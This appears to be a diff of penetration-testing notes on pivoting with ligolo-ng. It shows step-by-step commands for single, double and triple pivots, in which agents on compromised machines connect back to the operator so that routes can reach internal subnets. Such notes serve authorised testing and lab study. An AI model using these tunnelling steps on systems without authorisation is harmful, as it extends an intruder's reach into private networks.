@@ -1,40 +1,112 @@
 
 *Tips for stability*: `sudo ip link set tun0 mtu 1000`
-## First Pivot  (10.10.10.15 / 152.20.20.60)
-#### Create Interface
+
+---
+## First Pivot  
+
+Create Interface
+
 ```
 ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert
 ```
-#### Run Ligolo Agent on First Compromised Machine (10.10.10.15 / 152.20.20.60)
-*Transfer file to target & give the right permissions to it*
+
+Run Ligolo Agent on First Compromised Machine
+
 ```
 ./agent -connect 10.10.10.10:11601 -ignore-cert
 ```
-#### Create Tunnel on Ligolo
-```
-ligolo-ng >> session # Choose session
 
->> start --tun ligolo
+Create Tunnel on Ligolo
+
 ```
-#### Add Route for Ligolo Interface
+session
+start --tun ligolo
+```
+
+Add Route for Ligolo Interface
 
 ```
 sudo ip route add 152.20.20.0/24 dev ligolo
 ```
-# Troubleshooting
+
+Troubleshooting
 
 ```
 ip link delete ligolo
 ```
-## Second Pivot  (152.20.20.13 / 175.162.10.12)
-#### Create Interface
+
+---
+## Second Pivot
+
+Create Interface
+
 ```
-sudo ip tuntap add user saitama mode tun ligolo-double
+sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:11602
 ```
-#### Set Up Interface
+
+Run Ligolo Agent on Compromised Machine
+
 ```
-sudo ip link set ligolo-double up
+./agent -connect 10.10.10.10:11602 -ignore-cert
 ```
+
+Create Tunnel on Ligolo
+
+```
+session
+start --tun ligolo-double
+```
+
+Add Route for Ligolo-Double Interface
+
+```
+sudo ip route add 172.16.2.0/24 dev ligolo-double
+```
+
+Troubleshooting
+
+```
+ip link delete ligolo-double
+```
+
+---
+
+#### Triple Pivot
+
+Create Interface
+
+```
+sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:11603
+```
+
+Run Ligolo Agent on Compromised Machine
+
+```
+./agent -connect 10.10.10.10:11603 -ignore-cert
+```
+
+Create Tunnel on Ligolo
+
+```
+session
+start --tun ligolo-triple
+```
+
+Add Route for target endpoint (since whole subnet is redundant) for Ligolo-Triple Interface
+
+```
+sudo ip route add 172.16.2.101 dev ligolo-triple
+```
+
+Troubleshooting
+
+```
+ip link delete ligolo-triple
+```
+
+
+
+
 #### Go on Ligolo Session and Add Listener on First Pivot
 
 ```
